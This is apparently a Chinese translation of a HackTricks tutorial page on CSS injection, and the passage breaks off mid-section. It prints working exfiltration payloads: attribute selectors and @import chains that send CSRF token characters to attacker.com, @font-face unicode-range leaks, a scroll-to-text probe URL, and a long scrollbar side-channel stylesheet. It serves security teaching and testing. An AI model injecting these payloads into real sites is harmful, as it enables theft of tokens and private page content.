<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>CSS Injection</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="css-注入"><a class="header" href="#css-注入">CSS 注入</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="css-注入-1"><a class="header" href="#css-注入-1">CSS 注入</a></h2>
<h3 id="属性选择器"><a class="header" href="#属性选择器">属性选择器</a></h3>
<p>CSS 选择器被设计用来匹配 <code>input</code> 元素的 <code>name</code> 和 <code>value</code> 属性的值。如果输入元素的值属性以特定字符开头，则加载预定义的外部资源：</p>
<pre><code class="language-css">input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
</code></pre>
<p>然而，这种方法在处理隐藏输入元素（<code>type="hidden"</code>）时面临限制，因为隐藏元素不加载背景。</p>
<h4 id="绕过隐藏元素的限制"><a class="header" href="#绕过隐藏元素的限制">绕过隐藏元素的限制</a></h4>
<p>为了绕过这个限制，您可以使用 <code>~</code> 一般兄弟组合器来定位后续兄弟元素。然后，CSS 规则适用于所有跟随隐藏输入元素的兄弟元素，从而导致背景图像加载：</p>
<pre><code class="language-css">input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
</code></pre>
<p>一个利用此技术的实际示例在提供的代码片段中详细说明。您可以在 <a href="https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e">这里</a> 查看。</p>
<h4 id="css-注入的先决条件"><a class="header" href="#css-注入的先决条件">CSS 注入的先决条件</a></h4>
<p>为了使 CSS 注入技术有效，必须满足某些条件：</p>
<ol>
<li><strong>有效负载长度</strong>：CSS 注入向量必须支持足够长的有效负载，以容纳精心制作的选择器。</li>
<li><strong>CSS 重新评估</strong>：您应该能够框架页面，这对于触发使用新生成的有效负载重新评估 CSS 是必要的。</li>
<li><strong>外部资源</strong>：该技术假设能够使用外部托管的图像。这可能会受到网站内容安全策略 (CSP) 的限制。</li>
</ol>
<h3 id="盲属性选择器"><a class="header" href="#盲属性选择器">盲属性选择器</a></h3>
<p>正如 <a href="https://portswigger.net/research/blind-css-exfiltration"><strong>在这篇文章中解释的</strong></a>，可以结合选择器 <strong><code>:has</code></strong> 和 <strong><code>:not</code></strong> 来识别盲元素中的内容。这在您不知道加载 CSS 注入的网页内部内容时非常有用。<br />
还可以使用这些选择器从多个相同类型的块中提取信息，例如：</p>
<pre><code class="language-html">&lt;style&gt;
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
&lt;/style&gt;
&lt;input name=mytoken value=1337&gt;
&lt;input name=myname value=gareth&gt;
</code></pre>
<p>结合以下的 <strong>@import</strong> 技术，可以通过 <strong>blind-css-exfiltration</strong> 从盲页中提取大量 <strong>信息</strong>。</p>
<h3 id="import"><a class="header" href="#import">@import</a></h3>
<p>之前的技术有一些缺点，请检查先决条件。您要么需要能够 <strong>向受害者发送多个链接</strong>，要么需要能够 <strong>iframe CSS 注入漏洞页面</strong>。</p>
<p>然而，还有另一种巧妙的技术，使用 <strong>CSS <code>@import</code></strong> 来提高技术的质量。</p>
<p>这首先由 <a href="https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf"><strong>Pepe Vila</strong></a> 展示，其工作原理如下：</p>
<p>我们将 <strong>只加载一次页面，并仅通过导入到攻击者服务器</strong>（这是发送给受害者的有效载荷）。</p>
<pre><code class="language-css">@import url('//attacker.com:5001/start?');
</code></pre>
<ol>
<li>导入将会<strong>接收一些来自攻击者的CSS脚本</strong>，并且<strong>浏览器将加载它</strong>。</li>
<li>攻击者发送的CSS脚本的第一部分是<strong>另一个<code>@import</code>到攻击者的服务器</strong>。</li>
<li>攻击者的服务器不会立即响应这个请求，因为我们想要泄露一些字符，然后用有效载荷响应这个导入以泄露下一个字符。</li>
<li>有效载荷的第二部分和更大部分将是一个<strong>属性选择器泄露有效载荷</strong>。</li>
<li>这将向攻击者的服务器发送<strong>秘密的第一个字符和最后一个字符</strong>。</li>
<li>一旦攻击者的服务器接收到<strong>秘密的第一个和最后一个字符</strong>，它将<strong>响应步骤2中请求的导入</strong>。</li>
<li>响应将与<strong>步骤2、3和4</strong>完全相同，但这次它将尝试<strong>找到秘密的第二个字符，然后是倒数第二个</strong>。</li>
</ol>
<p>攻击者将<strong>遵循这个循环，直到完全泄露秘密</strong>。</p>
<p>您可以在这里找到原始的<a href="https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231"><strong>Pepe Vila的代码来利用这个</strong></a>，或者您可以在这里找到几乎<a href="./#css-injection"><strong>相同的代码但带有注释</strong>。</a></p>
<p>{% hint style="info" %}
该脚本将尝试每次发现2个字符（从开头和结尾），因为属性选择器允许执行类似的操作：</p>
<pre><code class="language-css">/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
</code></pre>
<p>这允许脚本更快地泄露秘密。
{% endhint %}</p>
<p>{% hint style="warning" %}
有时脚本<strong>无法正确检测到发现的前缀 + 后缀已经是完整的标志</strong>，它会继续向前（在前缀中）和向后（在后缀中）进行，并在某个时刻会挂起。<br />
不用担心，只需检查<strong>输出</strong>，因为<strong>你可以在那里看到标志</strong>。
{% endhint %}</p>
<h3 id="其他选择器"><a class="header" href="#其他选择器">其他选择器</a></h3>
<p>使用<strong>CSS选择器</strong>访问DOM部分的其他方法：</p>
<ul>
<li><strong><code>.class-to-search:nth-child(2)</code></strong>：这将搜索DOM中类为"class-to-search"的第二个项目。</li>
<li>**<code>:empty</code>**选择器：例如在<a href="https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker"><strong>这篇文章</strong></a><strong>中使用：</strong></li>
</ul>
<pre><code class="language-css">[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
</code></pre>
<h3 id="基于错误的xs-search"><a class="header" href="#基于错误的xs-search">基于错误的XS-Search</a></h3>
<p><strong>参考：</strong> <a href="https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html">基于CSS的攻击：滥用@font-face的unicode-range</a>，<a href="https://twitter.com/terjanq/status/1180477124861407234">基于错误的XS-Search PoC由@terjanq提供</a></p>
<p>总体意图是<strong>使用来自受控端点的自定义字体</strong>，并确保<strong>文本（在这种情况下为'A'）仅在指定资源（<code>favicon.ico</code>）无法加载时使用此字体显示</strong>。</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;object id="poc0" data="http://192.168.0.1/favicon.ico"&gt;A&lt;/object&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ol>
<li><strong>自定义字体使用</strong>：</li>
</ol>
<ul>
<li>使用 <code>&lt;style&gt;</code> 标签在 <code>&lt;head&gt;</code> 部分定义自定义字体，规则为 <code>@font-face</code>。</li>
<li>字体命名为 <code>poc</code>，并从外部端点获取（<code>http://attacker.com/?leak</code>）。</li>
<li><code>unicode-range</code> 属性设置为 <code>U+0041</code>，目标是特定的 Unicode 字符 'A'。</li>
</ul>
<ol start="2">
<li><strong>带有后备文本的对象元素</strong>：</li>
</ol>
<ul>
<li>在 <code>&lt;body&gt;</code> 部分创建一个 <code>id="poc0"</code> 的 <code>&lt;object&gt;</code> 元素。该元素尝试从 <code>http://192.168.0.1/favicon.ico</code> 加载资源。</li>
<li>此元素的 <code>font-family</code> 设置为在 <code>&lt;style&gt;</code> 部分定义的 <code>'poc'</code>。</li>
<li>如果资源（<code>favicon.ico</code>）加载失败，则在 <code>&lt;object&gt;</code> 标签内显示后备内容（字母 'A'）。</li>
<li>如果无法加载外部资源，后备内容（'A'）将使用自定义字体 <code>poc</code> 渲染。</li>
</ul>
<h3 id="样式滚动到文本片段"><a class="header" href="#样式滚动到文本片段">样式滚动到文本片段</a></h3>
<p><strong><code>:target</code></strong> 伪类用于选择由 <strong>URL 片段</strong> 定位的元素，如 <a href="https://drafts.csswg.org/selectors-4/#the-target-pseudo">CSS 选择器第 4 级规范</a> 中所述。重要的是要理解，<code>::target-text</code> 只有在文本被片段明确定位时才会匹配任何元素。</p>
<p>当攻击者利用 <strong>滚动到文本</strong> 片段功能时，会出现安全隐患，这使他们能够通过 HTML 注入从其服务器加载资源，以确认网页上特定文本的存在。该方法涉及注入如下 CSS 规则：</p>
<pre><code class="language-css">:target::before { content : url(target.png) }
</code></pre>
<p>在这种情况下，如果页面上存在文本“Administrator”，则会从服务器请求资源 <code>target.png</code>，这表明该文本的存在。此攻击的一个实例可以通过一个特殊构造的 URL 执行，该 URL 嵌入了注入的 CSS 以及一个 Scroll-to-text 片段：</p>
<pre><code>http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
</code></pre>
<p>这里，攻击利用HTML注入来传输CSS代码，针对特定文本“Administrator”通过Scroll-to-text fragment（<code>#:~:text=Administrator</code>）。如果找到该文本，指示的资源将被加载，无意中向攻击者发出其存在的信号。</p>
<p>为了缓解，以下几点应注意：</p>
<ol>
<li><strong>受限的STTF匹配</strong>：Scroll-to-text Fragment（STTF）旨在仅匹配单词或句子，从而限制其泄露任意秘密或令牌的能力。</li>
<li><strong>限制在顶级浏览上下文中</strong>：STTF仅在顶级浏览上下文中操作，不在iframe内工作，使任何利用尝试对用户更明显。</li>
<li><strong>用户激活的必要性</strong>：STTF需要用户激活手势才能操作，这意味着利用仅通过用户发起的导航才可行。这一要求大大降低了攻击在没有用户交互的情况下自动化的风险。然而，博客作者指出了特定条件和绕过方法（例如，社会工程学，与流行浏览器扩展的交互），可能会降低攻击的自动化难度。</li>
</ol>
<p>了解这些机制和潜在漏洞对于维护网络安全和防范此类利用策略至关重要。</p>
<p>有关更多信息，请查看原始报告：<a href="https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/">https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/</a></p>
<p>您可以在这里查看一个<a href="https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb"><strong>使用此技术的CTF利用</strong></a>。</p>
<h3 id="font-face--unicode-range"><a class="header" href="#font-face--unicode-range">@font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a></a></h3>
<p>您可以为特定的unicode值指定<strong>外部字体</strong>，这些字体<strong>仅在页面中存在这些unicode值时</strong>被<strong>收集</strong>。例如：</p>
<pre><code class="language-html">&lt;style&gt;
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
&lt;/style&gt;

&lt;p id="sensitive-information"&gt;AB&lt;/p&gt;htm
</code></pre>
<p>当您访问此页面时，Chrome 和 Firefox 会获取 "?A" 和 "?B"，因为敏感信息的文本节点包含 "A" 和 "B" 字符。但 Chrome 和 Firefox 不会获取 "?C"，因为它不包含 "C"。这意味着我们能够读取 "A" 和 "B"。</p>
<h3 id="文本节点外泄-i-连字"><a class="header" href="#文本节点外泄-i-连字">文本节点外泄 (I): 连字 <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a></a></h3>
<p><strong>参考:</strong> <a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/">Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację</a></p>
<p>所描述的技术涉及通过利用字体连字并监控宽度变化来提取节点中的文本。该过程包括几个步骤：</p>
<ol>
<li><strong>创建自定义字体</strong>：</li>
</ol>
<ul>
<li>SVG 字体是通过具有 <code>horiz-adv-x</code> 属性的字形制作的，该属性为表示两个字符序列的字形设置了较大的宽度。</li>
<li>示例 SVG 字形: <code>&lt;glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/&gt;</code>，其中 "XY" 表示一个两个字符的序列。</li>
<li>然后使用 fontforge 将这些字体转换为 woff 格式。</li>
</ul>
<ol start="2">
<li><strong>检测宽度变化</strong>：</li>
</ol>
<ul>
<li>使用 CSS 确保文本不换行 (<code>white-space: nowrap</code>) 并自定义滚动条样式。</li>
<li>水平滚动条的出现，样式独特，作为指示器（神谕），表明文本中存在特定的连字，因此存在特定的字符序列。</li>
<li>涉及的 CSS：</li>
</ul>
<pre><code class="language-css">body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
</code></pre>
<ol start="3">
<li><strong>利用过程</strong>：</li>
</ol>
<ul>
<li><strong>步骤 1</strong>：为具有较大宽度的字符对创建字体。</li>
<li><strong>步骤 2</strong>：使用基于滚动条的技巧来检测何时渲染大宽度字形（字符对的连字），指示字符序列的存在。</li>
<li><strong>步骤 3</strong>：在检测到连字后，生成表示三个字符序列的新字形，包含检测到的对并添加前导或后续字符。</li>
<li><strong>步骤 4</strong>：进行三个字符连字的检测。</li>
<li><strong>步骤 5</strong>：该过程重复，逐步揭示整个文本。</li>
</ul>
<ol start="4">
<li><strong>优化</strong>：</li>
</ol>
<ul>
<li>当前使用 <code>&lt;meta refresh=...</code> 的初始化方法并不理想。</li>
<li>更有效的方法可能涉及 CSS <code>@import</code> 技巧，提高利用的性能。</li>
</ul>
<h3 id="文本节点外泄-ii-使用默认字体泄露字符集不需要外部资源"><a class="header" href="#文本节点外泄-ii-使用默认字体泄露字符集不需要外部资源">文本节点外泄 (II): 使用默认字体泄露字符集（不需要外部资源） <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a></a></h3>
<p><strong>参考:</strong> <a href="https://demo.vwzq.net/css2.html">PoC using Comic Sans by @Cgvwzq &amp; @Terjanq</a></p>
<p>这个技巧在这个 <a href="https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/"><strong>Slackers 线程</strong></a> 中发布。文本节点中使用的字符集可以 <strong>使用浏览器中安装的默认字体</strong> 泄露：不需要外部或自定义字体。</p>
<p>该概念围绕利用动画逐步扩展 <code>div</code> 的宽度，使一个字符一次性从文本的“后缀”部分过渡到“前缀”部分。这个过程有效地将文本分成两个部分：</p>
<ol>
<li><strong>前缀</strong>：初始行。</li>
<li><strong>后缀</strong>：后续行。</li>
</ol>
<p>字符的过渡阶段将如下所示：</p>
<p><strong>C</strong><br />
ADB</p>
<p><strong>CA</strong><br />
DB</p>
<p><strong>CAD</strong><br />
B</p>
<p><strong>CADB</strong></p>
<p>在此过渡期间，<strong>unicode-range 技巧</strong>被用来识别每个新字符，因为它加入前缀。这是通过将字体切换到 Comic Sans 来实现的，后者明显比默认字体高，从而触发垂直滚动条。这个滚动条的出现间接揭示了前缀中存在新字符。</p>
<p>尽管这种方法允许检测到独特字符的出现，但并未指定哪个字符被重复，仅仅表明发生了重复。</p>
<p>{% hint style="info" %}
基本上，<strong>unicode-range 用于检测字符</strong>，但由于我们不想加载外部字体，因此需要找到另一种方法。<br />
当 <strong>字符</strong> 被 <strong>找到</strong> 时，它被 <strong>赋予</strong> 预安装的 <strong>Comic Sans 字体</strong>，这使得字符 <strong>变大</strong> 并 <strong>触发滚动条</strong>，这将 <strong>泄露找到的字符</strong>。
{% endhint %}</p>
<p>检查从 PoC 中提取的代码：</p>
<pre><code class="language-css">/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
</code></pre>
<h3 id="文本节点外泄-iii通过隐藏元素以默认字体泄露字符集不需要外部资源"><a class="header" href="#文本节点外泄-iii通过隐藏元素以默认字体泄露字符集不需要外部资源">文本节点外泄 (III)：通过隐藏元素以默认字体泄露字符集（不需要外部资源） <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a></a></h3>
<p><strong>参考：</strong> 这在<a href="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves">这篇文章中被提到作为一个不成功的解决方案</a></p>
<p>这个案例与之前的非常相似，然而，在这个案例中，特定字符比其他字符更大的目标是<strong>隐藏某些东西</strong>，比如一个不希望被机器人点击的按钮或一个不会被加载的图像。因此，我们可以测量这个动作（或缺乏动作），并知道特定字符是否存在于文本中。</p>
<h3 id="文本节点外泄-iii通过缓存时间泄露字符集不需要外部资源"><a class="header" href="#文本节点外泄-iii通过缓存时间泄露字符集不需要外部资源">文本节点外泄 (III)：通过缓存时间泄露字符集（不需要外部资源） <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a></a></h3>
